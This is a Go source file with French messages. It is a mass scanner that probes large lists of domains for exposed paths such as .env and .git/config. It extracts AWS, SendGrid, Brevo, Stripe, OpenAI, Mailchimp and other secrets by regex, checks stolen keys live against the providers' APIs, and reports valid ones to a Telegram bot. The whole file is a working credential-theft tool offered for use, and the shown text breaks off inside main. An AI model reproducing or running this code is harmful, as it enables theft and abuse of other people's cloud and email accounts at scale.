package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"embed"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

//go:embed paths.txt
var embeddedPaths embed.FS

const (
	Reset  = "\033[0m"
	Red    = "\033[38;5;203m"
	Green  = "\033[38;5;114m"
	Blue   = "\033[38;5;75m"
	Yellow = "\033[38;5;221m"
	Cyan   = "\033[38;5;51m"

	MAX_THREADS             = 700
	CHUNK_SIZE              = 100000
	TEMP_DIR                = "TEMPURL"
	CONTEXT_LINES           = 10
	HTTP_TIMEOUT            = 12 * time.Second
	MAX_IDLE_CONNS          = 100
	MAX_CONNS_PER_HOST      = 50
	BUFFER_SIZE             = 16384
	WRITE_BUFFER_SIZE       = 500
	MAX_RESPONSE_SIZE       = 1 * 1024 * 1024
	MAX_CONCURRENT_REQUESTS = 50
	defaultPathsFile        = "paths.txt"
	legacyPathsFile         = "path.txt"
)

type ApiService struct {
	Pattern    *regexp.Regexp
	Name       string
	ResultFile string
}

type Result struct {
	Content    string
	ResultFile string
}

type Stats struct {
	totalProcessed int64
	totalFound     int64
	totalErrors    int64
	startTime      time.Time
}

var (
	apiServices []ApiService

	awsKeyRegex    *regexp.Regexp
	awsSecretRegex *regexp.Regexp
	sendgridRegex1 *regexp.Regexp
	sendgridRegex2 *regexp.Regexp
	brevoRegex     *regexp.Regexp
	twilioRegex    *regexp.Regexp

	// Motifs additionnels (fusion avec l’ancien scanner Python)
	awsAKIARegex      *regexp.Regexp
	awsAltPrefixRegex *regexp.Regexp
	awsKeywordsRegex  *regexp.Regexp
	sendgridKwRegex   *regexp.Regexp
	brevoKwRegex      *regexp.Regexp
	postmarkTokenRe   *regexp.Regexp
	sparkpostKeyRe    *regexp.Regexp
	mailchimpKeyRe    *regexp.Regexp
	genericSMTPHostRe *regexp.Regexp

	httpClient *http.Client

	resultChannels map[string]chan Result
	resultWg       sync.WaitGroup

	stats Stats

	fileMutexes map[string]*sync.Mutex
	mutexLock   sync.RWMutex

	pathList []string

	bufferPool sync.Pool
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	bufferPool = sync.Pool{
		New: func() interface{} {
			return bytes.NewBuffer(make([]byte, 0, BUFFER_SIZE))
		},
	}

	awsKeyRegex = regexp.MustCompile(`["']?AWS_ACCESS_KEY_ID["']?\s*[:=]\s*["']?([^"'\s]{10,})["']?`)
	awsSecretRegex = regexp.MustCompile(`["']?AWS_SECRET_ACCESS_KEY["']?\s*[:=]\s*["']?([^"'\s]{10,})["']?`)
	sendgridRegex1 = regexp.MustCompile(`SENDGRID_API_KEY\s*[:=]\s*([^\s]+)`)
	sendgridRegex2 = regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`)
	// Python: 16 caractères finaux ; ancien Go: 6 — on accepte les deux plages
	brevoRegex = regexp.MustCompile(`xkeysib-[a-f0-9]{64}-[A-Za-z0-9]{6,16}`)
	twilioRegex = regexp.MustCompile(`AC[a-z0-9]{32}`)

	awsAKIARegex = regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`)
	awsAltPrefixRegex = regexp.MustCompile(`\b(?:ASIA|AIDA|AROA|AIPA|ANPA|ANVA|AGPA)[0-9A-Z]{16}\b`)
	awsKeywordsRegex = regexp.MustCompile(`(?i)\b(aws_access_key_id|aws_secret_access_key|amazonaws\.com|\[default\]\s*aws_access_key_id)\b`)
	sendgridKwRegex = regexp.MustCompile(`(?i)\b(sendgrid|smtp\.sendgrid\.net)\b`)
	brevoKwRegex = regexp.MustCompile(`(?i)\b(brevo|sendinblue|smtp-relay\.brevo\.com|smtp-relay\.sendinblue\.com)\b`)

	postmarkTokenRe = regexp.MustCompile(`(?i)POSTMARK(?:_SERVER)?_TOKEN\s*[=:]\s*['\"]?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})`)
	sparkpostKeyRe = regexp.MustCompile(`(?i)SPARKPOST(?:_API)?_KEY\s*[=:]\s*['\"]?([^\s'\"]+)`)
	mailchimpKeyRe = regexp.MustCompile(`(?i)MAILCHIMP(?:_API)?_KEY\s*[=:]\s*['\"]?([0-9a-f]{32}-us[0-9]{1,3})`)
	genericSMTPHostRe = regexp.MustCompile(`(?i)\b(?:smtp|mail|email|relay)\.[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\.(?:[a-z]{2,}|xn--[a-z0-9-]+)\b`)

	apiServices = []ApiService{
		// Brevo / SendGrid / Twilio: traités par check* + save* pour *_full.txt
		{Pattern: regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24,}`), Name: "Stripe", ResultFile: "results/stripe.txt"},
		{Pattern: regexp.MustCompile(`key-[a-f0-9]{32}`), Name: "Sendinblue", ResultFile: "results/sendinblue.txt"},
		{Pattern: regexp.MustCompile(`smtp\.office365\.com`), Name: "Office365", ResultFile: "results/office.txt"},
		{Pattern: regexp.MustCompile(`sk-[0-9a-zA-Z]{48}`), Name: "OpenAI", ResultFile: "results/openai.txt"},
		{Pattern: regexp.MustCompile(`AKIA[0-9A-Z]{16}`), Name: "AWS Key (AKIA)", ResultFile: "results/aws.txt"},
		{Pattern: awsAKIARegex, Name: "AWS AKIA (word boundary)", ResultFile: "results/aws.txt"},
		{Pattern: awsAltPrefixRegex, Name: "AWS key (STS/IAM prefix)", ResultFile: "results/aws.txt"},
		{Pattern: awsKeywordsRegex, Name: "AWS keywords", ResultFile: "results/aws_keywords.txt"},
		{Pattern: sendgridKwRegex, Name: "SendGrid keywords", ResultFile: "results/sendgrid_keywords.txt"},
		{Pattern: brevoKwRegex, Name: "Brevo keywords", ResultFile: "results/brevo_keywords.txt"},
		{Pattern: regexp.MustCompile(`api\.postmarkapp\.com|POSTMARK`), Name: "Postmark", ResultFile: "results/postmark.txt"},
		{Pattern: regexp.MustCompile(`(?i)sparkpost\.com|SPARKPOST`), Name: "SparkPost", ResultFile: "results/sparkpost.txt"},
		{Pattern: regexp.MustCompile(`(?i)mailchimp\.com|mandrillapp\.com`), Name: "Mailchimp/Mandrill", ResultFile: "results/mailchimp.txt"},
		{Pattern: genericSMTPHostRe, Name: "SMTP host (generic)", ResultFile: "results/smtp_hosts.txt"},
	}

	transport := &http.Transport{
		MaxIdleConns:        MAX_IDLE_CONNS,
		MaxIdleConnsPerHost: MAX_CONNS_PER_HOST,
		MaxConnsPerHost:     MAX_CONNS_PER_HOST,
		IdleConnTimeout:     120 * time.Second,
		DisableKeepAlives:   false,
		DisableCompression:  false,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 60 * time.Second,
			DualStack: true,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		TLSHandshakeTimeout:   5 * time.Second,
		ResponseHeaderTimeout: 8 * time.Second,
		ExpectContinueTimeout: 2 * time.Second,
	}

	httpClient = &http.Client{
		Transport: transport,
		Timeout:   HTTP_TIMEOUT,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 2 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	resultChannels = make(map[string]chan Result)
	fileMutexes = make(map[string]*sync.Mutex)
}

func normalizePathLine(line string) (string, bool) {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return "", false
	}
	if !strings.HasPrefix(line, "/") {
		line = "/" + line
	}
	if strings.Contains(line, "*") {
		line = strings.ReplaceAll(line, "main.*.js", "main.js")
		if strings.Contains(line, "*") {
			return "", false
		}
	}
	return line, true
}

func loadPathList(pathsFile string) {
	pathList = nil

	var reader *bufio.Scanner
	var closer func()

	if pathsFile != "" {
		if f, err := os.Open(pathsFile); err == nil {
			reader = bufio.NewScanner(f)
			closer = func() { f.Close() }
			fmt.Printf("[+] %sChemins depuis %s%s\n", Green, pathsFile, Reset)
		}
	}
	if reader == nil {
		if f, err := os.Open(defaultPathsFile); err == nil {
			reader = bufio.NewScanner(f)
			closer = func() { f.Close() }
			fmt.Printf("[+] %sChemins depuis ./%s%s\n", Green, defaultPathsFile, Reset)
		}
	}
	if reader == nil {
		if f, err := os.Open(legacyPathsFile); err == nil {
			reader = bufio.NewScanner(f)
			closer = func() { f.Close() }
			fmt.Printf("[+] %sChemins depuis ./%s%s\n", Green, legacyPathsFile, Reset)
		}
	}
	if reader == nil {
		data, err := fs.ReadFile(embeddedPaths, defaultPathsFile)
		if err != nil {
			fmt.Printf("[-] %sImpossible de charger %s (embed): %v%s\n", Red, defaultPathsFile, err, Reset)
			return
		}
		reader = bufio.NewScanner(bytes.NewReader(data))
		fmt.Printf("[+] %sChemins embarqués (%s)%s\n", Green, defaultPathsFile, Reset)
	}
	if closer != nil {
		defer closer()
	}

	seen := make(map[string]struct{})
	for reader.Scan() {
		p, ok := normalizePathLine(reader.Text())
		if !ok {
			continue
		}
		if _, dup := seen[p]; dup {
			continue
		}
		seen[p] = struct{}{}
		pathList = append(pathList, p)
	}
	if err := reader.Err(); err != nil {
		fmt.Printf("[-] %sErreur lecture chemins: %v%s\n", Red, err, Reset)
	}
	fmt.Printf("[+] %s%d chemins chargés%s\n", Green, len(pathList), Reset)
}

func joinURL(site, path string) string {
	base := strings.TrimSpace(site)
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	u, err := url.Parse(base)
	if err != nil {
		return strings.TrimRight(base, "/") + path
	}
	rel, err := url.Parse(path)
	if err != nil {
		return strings.TrimRight(base, "/") + path
	}
	return u.ResolveReference(rel).String()
}

func getFileMutex(filename string) *sync.Mutex {
	mutexLock.RLock()
	mu, exists := fileMutexes[filename]
	mutexLock.RUnlock()

	if !exists {
		mutexLock.Lock()
		mu, exists = fileMutexes[filename]
		if !exists {
			mu = &sync.Mutex{}
			fileMutexes[filename] = mu
		}
		mutexLock.Unlock()
	}
	return mu
}

func getResultChannel(filename string) chan Result {
	mutexLock.RLock()
	ch, exists := resultChannels[filename]
	mutexLock.RUnlock()

	if !exists {
		mutexLock.Lock()
		ch, exists = resultChannels[filename]
		if !exists {
			ch = make(chan Result, WRITE_BUFFER_SIZE)
			resultChannels[filename] = ch
			resultWg.Add(1)
			go batchWriter(filename, ch)
		}
		mutexLock.Unlock()
	}
	return ch
}

func batchWriter(filename string, ch chan Result) {
	defer resultWg.Done()

	buffer := make([]string, 0, WRITE_BUFFER_SIZE)
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	flush := func() {
		if len(buffer) == 0 {
			return
		}
		mutex := getFileMutex(filename)
		mutex.Lock()
		defer mutex.Unlock()

		f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("[-] %sErreur écriture %s: %v%s\n", Red, filename, err, Reset)
			return
		}
		defer f.Close()

		writer := bufio.NewWriterSize(f, BUFFER_SIZE)
		for _, content := range buffer {
			if _, err := writer.WriteString(content); err != nil {
				fmt.Printf("[-] %sErreur écriture buffer %s: %v%s\n", Red, filename, err, Reset)
			}
		}
		if err := writer.Flush(); err != nil {
			fmt.Printf("[-] %sErreur flush %s: %v%s\n", Red, filename, err, Reset)
		}
		buffer = buffer[:0]
	}

	for {
		select {
		case result, ok := <-ch:
			if !ok {
				flush()
				return
			}
			buffer = append(buffer, result.Content)
			if len(buffer) >= WRITE_BUFFER_SIZE {
				flush()
			}
		case <-ticker.C:
			flush()
		}
	}
}

func queueResult(filename, content string) {
	ch := getResultChannel(filename)
	select {
	case ch <- Result{Content: content, ResultFile: filename}:
	default:
		fmt.Printf("[!] %sChannel plein pour %s, attente...%s\n", Yellow, filename, Reset)
		time.Sleep(100 * time.Millisecond)
		ch <- Result{Content: content, ResultFile: filename}
	}
}

func extractContext(content string, matchIndex int, contextLines int) string {
	if len(content) == 0 || matchIndex < 0 || matchIndex >= len(content) {
		return ""
	}
	lines := strings.Split(content, "\n")
	matchLine := 0
	currentPos := 0
	for i, line := range lines {
		if currentPos+len(line) >= matchIndex {
			matchLine = i
			break
		}
		currentPos += len(line) + 1
	}
	start := matchLine - contextLines
	if start < 0 {
		start = 0
	}
	end := matchLine + contextLines + 1
	if end > len(lines) {
		end = len(lines)
	}
	return strings.Join(lines[start:end], "\n")
}

func printLogo() {
	fmt.Printf("%s\n===========================================\n", Blue)
	fmt.Printf("  Domain scanner (Go) — paths + credentials\n")
	fmt.Printf("==========================================%s\n", Reset)
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func saveCredentials(accessKeyId, secretAccessKey, source string, content string) {
	ok, region, arn, account, userID, errDetail := validateAWS(accessKeyId, secretAccessKey)
	if !ok {
		fmt.Printf("[-] %sAWS rejeté (STS): %s%s\n", Yellow, truncateStr(errDetail, 200), Reset)
		return
	}
	contextContent := extractContext(content,
		strings.Index(content, accessKeyId), CONTEXT_LINES)
	saveContent := fmt.Sprintf("Source: %s\nVALID region=%s\nARN=%s\nAccount=%s\n%s\n\n",
		source, region, arn, account, contextContent)
	queueResult("results/aws_full.txt", saveContent)
	if !strings.Contains(source, "/.env") {
		historyContent := fmt.Sprintf("Site: %s | Service: AWS (valid)\nContexte:\n%s\n\n---\n\n",
			source, contextContent)
		queueResult("results/history.txt", historyContent)
	}
	atomic.AddInt64(&stats.totalFound, 1)
	fmt.Printf("[+] %sAWS VALIDÉ (%s): %s%s\n", Green, region, accessKeyId, Reset)
	notifyAWSValid(source, accessKeyId, secretAccessKey, region, arn, account, userID, strings.Join(awsSTSCandidateRegions, ", "))
}

func saveSendgridCredentials(apiKey, source string, content string) {
	ok, quota, raw := validateSendGrid(apiKey)
	if !ok {
		fmt.Printf("[-] %sSendGrid rejeté (API): %s%s\n", Yellow, truncateStr(raw, 120), Reset)
		return
	}
	contextContent := extractContext(content, strings.Index(content, apiKey), CONTEXT_LINES)
	saveContent := fmt.Sprintf("Source: %s\nQUOTA: %s\n%s\n\n%s\n\n", source, quota, contextContent, raw)
	queueResult("results/sendgrid_full.txt", saveContent)
	queueResult("results/sendgrid.txt", saveContent)
	if !strings.Contains(source, "/.env") {
		historyContent := fmt.Sprintf("Site: %s | Service: SendGrid (valid)\nContexte:\n%s\n\n---\n\n",
			source, contextContent)
		queueResult("results/history.txt", historyContent)
	}
	atomic.AddInt64(&stats.totalFound, 1)
	displayKey := apiKey
	if len(apiKey) > 8 {
		displayKey = apiKey[:8] + "..."
	}
	fmt.Printf("[+] %sSendGrid VALIDÉ: %s | %s%s\n", Green, displayKey, quota, Reset)
	notifySendGridValid(source, apiKey, quota, raw)
}

func saveBrevoCredentials(apiKey, source string, content string) {
	ok, quota, raw := validateBrevo(apiKey)
	if !ok {
		fmt.Printf("[-] %sBrevo rejeté (API): %s%s\n", Yellow, truncateStr(raw, 120), Reset)
		return
	}
	contextContent := extractContext(content, strings.Index(content, apiKey), CONTEXT_LINES)
	saveContent := fmt.Sprintf("Source: %s\n%s\n\nQUOTA: %s\n\n%s\n\n", source, contextContent, quota, raw)
	queueResult("results/brevo_full.txt", saveContent)
	queueResult("results/brevo.txt", saveContent)
	if !strings.Contains(source, "/.env") {
		historyContent := fmt.Sprintf("Site: %s | Service: Brevo (valid)\nContexte:\n%s\n\n---\n\n",
			source, contextContent)
		queueResult("results/history.txt", historyContent)
	}
	atomic.AddInt64(&stats.totalFound, 1)
	displayKey := apiKey
	if len(apiKey) > 8 {
		displayKey = apiKey[:8] + "..."
	}
	fmt.Printf("[+] %sBrevo VALIDÉ: %s | %s%s\n", Green, displayKey, quota, Reset)
	notifyBrevoValid(source, apiKey, quota, raw)
}

func saveTwilioCredentials(accountSid, source string, content string) {
	contextContent := extractContext(content, strings.Index(content, accountSid), CONTEXT_LINES)
	saveContent := fmt.Sprintf("Source: %s\n%s\n\n", source, contextContent)
	queueResult("results/twilio.txt", saveContent)
	if !strings.Contains(source, "/.env") {
		historyContent := fmt.Sprintf("Site: %s | Service: Twilio\nContexte:\n%s\n\n---\n\n",
			source, contextContent)
		queueResult("results/history.txt", historyContent)
	}
	atomic.AddInt64(&stats.totalFound, 1)
	fmt.Printf("[+] %sTwilio: %s%s\n", Green, accountSid, Reset)
}

func checkTwilioCredentials(bodyStr, source string) {
	if twilioAccounts := twilioRegex.FindAllString(bodyStr, -1); len(twilioAccounts) > 0 {
		for _, accountSid := range twilioAccounts {
			saveTwilioCredentials(accountSid, source, bodyStr)
		}
	}
}

func checkSendgridCredentials(bodyStr, source string) {
	seen := make(map[string]struct{})
	if sendgridKey := sendgridRegex1.FindStringSubmatch(bodyStr); len(sendgridKey) > 1 {
		k := sendgridKey[1]
		if _, ok := seen[k]; !ok {
			seen[k] = struct{}{}
			saveSendgridCredentials(k, source, bodyStr)
		}
	}
	if sendgridKeys := sendgridRegex2.FindAllString(bodyStr, -1); len(sendgridKeys) > 0 {
		for _, key := range sendgridKeys {
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			saveSendgridCredentials(key, source, bodyStr)
		}
	}
}

func checkBrevoCredentials(bodyStr, source string) {
	seen := make(map[string]struct{})
	if brevoKeys := brevoRegex.FindAllString(bodyStr, -1); len(brevoKeys) > 0 {
		for _, key := range brevoKeys {
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			saveBrevoCredentials(key, source, bodyStr)
		}
	}
}

func checkPostmarkSparkPostMailchimp(bodyStr, source string) {
	seen := make(map[string]struct{})
	for _, m := range postmarkTokenRe.FindAllStringSubmatch(bodyStr, -1) {
		if len(m) < 2 {
			continue
		}
		tok := m[1]
		if _, ok := seen["pm:"+tok]; ok {
			continue
		}
		seen["pm:"+tok] = struct{}{}
		if ok, detail := validatePostmark(tok); ok {
			ctx := extractContext(bodyStr, strings.Index(bodyStr, tok), CONTEXT_LINES)
			queueResult("results/postmark_valid.txt", fmt.Sprintf("Source: %s\nToken: %s\n%s\n\n%s\n\n", source, tok, detail, ctx))
			atomic.AddInt64(&stats.totalFound, 1)
			fmt.Printf("[+] %sPostmark VALIDÉ%s\n", Green, Reset)
			notifyProviderValid("Postmark", source, tok, detail)
		}
	}
	for _, m := range sparkpostKeyRe.FindAllStringSubmatch(bodyStr, -1) {
		if len(m) < 2 {
			continue
		}
		key := m[1]
		if _, ok := seen["sp:"+key]; ok {
			continue
		}
		seen["sp:"+key] = struct{}{}
		if ok, detail := validateSparkPost(key); ok {
			ctx := extractContext(bodyStr, strings.Index(bodyStr, key), CONTEXT_LINES)
			queueResult("results/sparkpost_valid.txt", fmt.Sprintf("Source: %s\nKey: %s\n%s\n\n%s\n\n", source, key, detail, ctx))
			atomic.AddInt64(&stats.totalFound, 1)
			fmt.Printf("[+] %sSparkPost VALIDÉ%s\n", Green, Reset)
			notifyProviderValid("SparkPost", source, key, detail)
		}
	}
	for _, m := range mailchimpKeyRe.FindAllStringSubmatch(bodyStr, -1) {
		if len(m) < 2 {
			continue
		}
		key := m[1]
		if _, ok := seen["mc:"+key]; ok {
			continue
		}
		seen["mc:"+key] = struct{}{}
		if ok, detail := validateMailchimp(key); ok {
			ctx := extractContext(bodyStr, strings.Index(bodyStr, key), CONTEXT_LINES)
			queueResult("results/mailchimp_valid.txt", fmt.Sprintf("Source: %s\nKey: %s\n%s\n\n%s\n\n", source, key, detail, ctx))
			atomic.AddInt64(&stats.totalFound, 1)
			fmt.Printf("[+] %sMailchimp VALIDÉ%s\n", Green, Reset)
			notifyProviderValid("Mailchimp", source, key, detail)
		}
	}
}

func makeRequest(urlStr string) ([]byte, int, error) {
	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, resp.StatusCode, fmt.Errorf("status: %d", resp.StatusCode)
	}

	buf := bufferPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufferPool.Put(buf)

	_, err = io.CopyN(buf, resp.Body, MAX_RESPONSE_SIZE)
	if err != nil && err != io.EOF {
		return nil, resp.StatusCode, err
	}
	return buf.Bytes(), resp.StatusCode, nil
}

func maybeSaveGitExposure(source, bodyStr string) {
	if !strings.Contains(source, "/.git/config") {
		return
	}
	if !strings.Contains(bodyStr, "[core]") {
		return
	}
	saveContent := fmt.Sprintf("=== %s ===\n%s\n\n", source, bodyStr)
	queueResult("results/git_config.txt", saveContent)
	queueResult("results/git_repos.txt", strings.Split(source, "/.git")[0]+"\n")
	fmt.Printf("[+] %s.git/config exposé (fichiers git_*)%s\n", Green, Reset)
}

func processBody(bodyBytes []byte, source string) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[-] %sPanic in processBody for %s: %v%s\n", Red, source, r, Reset)
			atomic.AddInt64(&stats.totalErrors, 1)
		}
	}()

	bodyStr := string(bodyBytes)

	if awsKeys := awsKeyRegex.FindStringSubmatch(bodyStr); len(awsKeys) > 1 {
		if awsSecrets := awsSecretRegex.FindStringSubmatch(bodyStr); len(awsSecrets) > 1 {
			saveCredentials(awsKeys[1], awsSecrets[1], source, bodyStr)
		}
	}

	checkSendgridCredentials(bodyStr, source)
	checkBrevoCredentials(bodyStr, source)
	checkPostmarkSparkPostMailchimp(bodyStr, source)
	checkTwilioCredentials(bodyStr, source)

	for _, service := range apiServices {
		apiMatches := service.Pattern.FindAllString(bodyStr, -1)
		if len(apiMatches) == 0 {
			continue
		}
		seen := make(map[string]struct{})
		for _, apiKey := range apiMatches {
			if _, dup := seen[apiKey]; dup {
				continue
			}
			seen[apiKey] = struct{}{}
			idx := strings.Index(bodyStr, apiKey)
			if idx < 0 {
				continue
			}
			contextContent := extractContext(bodyStr, idx, CONTEXT_LINES)
			saveContent := fmt.Sprintf("Source: %s\n%s\n\n", source, contextContent)
			queueResult(service.ResultFile, saveContent)
			if !strings.Contains(source, "/.env") {
				historyContent := fmt.Sprintf("Site: %s | Service: %s\nContexte:\n%s\n\n---\n\n",
					source, service.Name, contextContent)
				queueResult("results/history.txt", historyContent)
			}
			atomic.AddInt64(&stats.totalFound, 1)
		}
		fmt.Printf("[+] %s%s: %d occurrence(s)%s\n",
			Green, service.Name, len(seen), Reset)
	}

	maybeSaveGitExposure(source, bodyStr)
}

func checkPath(site, path string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	defer func() { <-sem }()

	fullURL := joinURL(site, path)
	body, status, err := makeRequest(fullURL)
	if err != nil {
		return
	}
	fmt.Printf("[+] %s %d: %s%s\n", fullURL, status, Green, path+Reset)
	processBody(body, fullURL)
}

func processSite(site string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()
	defer func() {
		<-sem
		atomic.AddInt64(&stats.totalProcessed, 1)
		if r := recover(); r != nil {
			fmt.Printf("[-] %sPanic in %s: %v%s\n", Red, site, r, Reset)
			atomic.AddInt64(&stats.totalErrors, 1)
			buf := make([]byte, 1024)
			n := runtime.Stack(buf, false)
			fmt.Printf("%sStack trace:\n%s%s\n", Yellow, string(buf[:n]), Reset)
		}
	}()

	site = strings.TrimSpace(site)
	if site == "" {
		return
	}
	if !strings.HasPrefix(site, "http://") && !strings.HasPrefix(site, "https://") {
		site = "https://" + site
	}

	pathWg := &sync.WaitGroup{}
	pathSem := make(chan struct{}, 20)

	for _, p := range pathList {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		pathSem <- struct{}{}
		pathWg.Add(1)
		go checkPath(site, p, pathWg, pathSem)
	}
	pathWg.Wait()
}

func splitFileIntoChunks(inputFile string) ([]string, error) {
	fmt.Printf("%s[*] Analyse du fichier d'entrée...%s\n", Cyan, Reset)
	if err := os.MkdirAll(TEMP_DIR, 0755); err != nil {
		return nil, fmt.Errorf("création %s: %w", TEMP_DIR, err)
	}
	file, err := os.Open(inputFile)
	if err != nil {
		return nil, fmt.Errorf("ouverture: %w", err)
	}
	defer file.Close()

	var chunkFiles []string
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, BUFFER_SIZE), BUFFER_SIZE)
	chunkIndex := 0
	lineCount := 0
	var currentChunk *bufio.Writer
	var currentFile *os.File

	for scanner.Scan() {
		if lineCount%CHUNK_SIZE == 0 {
			if currentChunk != nil {
				currentChunk.Flush()
				currentFile.Close()
			}
			chunkFileName := filepath.Join(TEMP_DIR, fmt.Sprintf("chunk_%04d.txt", chunkIndex))
			chunkFiles = append(chunkFiles, chunkFileName)
			currentFile, err = os.Create(chunkFileName)
			if err != nil {
				return nil, err
			}
			currentChunk = bufio.NewWriterSize(currentFile, BUFFER_SIZE)
			chunkIndex++
		}
		if currentChunk != nil {
			currentChunk.WriteString(scanner.Text() + "\n")
		}
		lineCount++
	}
	if currentChunk != nil {
		currentChunk.Flush()
		currentFile.Close()
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	fmt.Printf("%s[+] %d chunk(s), %d ligne(s)%s\n", Green, len(chunkFiles), lineCount, Reset)
	return chunkFiles, nil
}

func processChunk(chunkFile string, chunkNum int, totalChunks int) error {
	fmt.Printf("\n%s[*] Chunk %d/%d: %s%s\n", Cyan, chunkNum, totalChunks, chunkFile, Reset)
	file, err := os.Open(chunkFile)
	if err != nil {
		return err
	}
	defer file.Close()

	var wg sync.WaitGroup
	sem := make(chan struct{}, MAX_THREADS)
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, BUFFER_SIZE), BUFFER_SIZE)
	processedLines := 0

	for scanner.Scan() {
		site := scanner.Text()
		sem <- struct{}{}
		wg.Add(1)
		go processSite(site, &wg, sem)
		processedLines++
		if processedLines%100 == 0 {
			time.Sleep(10 * time.Millisecond)
		}
	}
	wg.Wait()

	processed := atomic.LoadInt64(&stats.totalProcessed)
	found := atomic.LoadInt64(&stats.totalFound)
	elapsed := time.Since(stats.startTime)
	rate := float64(processed) / elapsed.Seconds()
	fmt.Printf("%s[+] Chunk %d/%d terminé (%d domaines, %d trouvés, %.0f domaines/s)%s\n",
		Green, chunkNum, totalChunks, processedLines, found, rate, Reset)
	return scanner.Err()
}

func deleteChunk(chunkFile string) error {
	return os.Remove(chunkFile)
}

func cleanupTempDir() error {
	err := os.RemoveAll(TEMP_DIR)
	if err != nil {
		return err
	}
	fmt.Printf("%s[+] Dossier %s supprimé%s\n", Green, TEMP_DIR, Reset)
	return nil
}

func closeAllWriters() {
	mutexLock.Lock()
	for _, ch := range resultChannels {
		close(ch)
	}
	resultChannels = make(map[string]chan Result)
	mutexLock.Unlock()
	resultWg.Wait()
}

func printStats() {
	elapsed := time.Since(stats.startTime)
	processed := atomic.LoadInt64(&stats.totalProcessed)
	found := atomic.LoadInt64(&stats.totalFound)
	errors := atomic.LoadInt64(&stats.totalErrors)
	fmt.Printf("\n%s======================%s\n", Blue, Reset)
	fmt.Printf("%sDomaines traités: %s%d%s\n", Cyan, Green, processed, Reset)
	fmt.Printf("%sCorrespondances enregistrées: %s%d%s\n", Cyan, Green, found, Reset)
	fmt.Printf("%sErreurs: %s%d%s\n", Cyan, Yellow, errors, Reset)
	fmt.Printf("%sDurée: %s%s%s\n", Cyan, Green, elapsed.Round(time.Second), Reset)
	if processed > 0 {
		fmt.Printf("%sDébit: %s%.0f domaines/s%s\n", Cyan, Green, float64(processed)/elapsed.Seconds(), Reset)
	}
	fmt.Printf("%s======================================%s\n", Blue, Reset)
}

func main() {
	pathsFlag := flag.String("paths", "", "fichier liste de chemins (défaut: ./paths.txt ou embarqué)")
	flag.Parse()
	args := flag.Args()
	if len(args) != 1 {
		fmt.Printf("%sUsage: %s [-paths chemins.txt] <domains.txt>%s\n", Yellow, os.Args[0], Reset)
		os.Exit(1)
	}
	loadPathList(*pathsFlag)
	stats.startTime = time.Now()
	if len(pathList) == 0 {
		fmt.Printf("[-] %sAucun chemin à tester. Abandon.%s\n", Red, Reset)
		os.Exit(1)
	}

	printLogo()
	loadTelegramFromEnv()
	if !telegramReady {
		fmt.Printf("%s[!] Telegram désactivé: export TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID pour les alertes%s\n", Yellow, Reset)
	}
	if err := os.MkdirAll("results", 0755); err != nil {
		fmt.Printf("[-] %sresults/: %v%s\n", Red, err, Reset)
		os.Exit(1)
	}
	inputFile := args[0]
	if _, err := os.Stat(inputFile); os.IsNotExist(err) {
		fmt.Printf("[-] %sFichier introuvable: %s%s\n", Red, inputFile, Reset)
		os.Exit(1)
	}
	chunkFiles, err := splitFileIntoChunks(inputFile)
	if err != nil {
		fmt.Printf("[-] %sDécoupage: %v%s\n", Red, err, Reset)
		os.Exit(1)
	}
	if len(chunkFiles) == 0 {
		fmt.Printf("[-] %sRien à traiter%s\n", Red, Reset)
		os.Exit(1)
	}
	for i, chunkFile := range chunkFiles {
		if err := processChunk(chunkFile, i+1, len(chunkFiles)); err != nil {
			fmt.Printf("[-] %sChunk %s: %v%s\n", Red, chunkFile, err, Reset)
			atomic.AddInt64(&stats.totalErrors, 1)
		}
		if err := deleteChunk(chunkFile); err != nil {
			fmt.Printf("[-] %sSuppression chunk: %v%s\n", Yellow, err, Reset)
		}
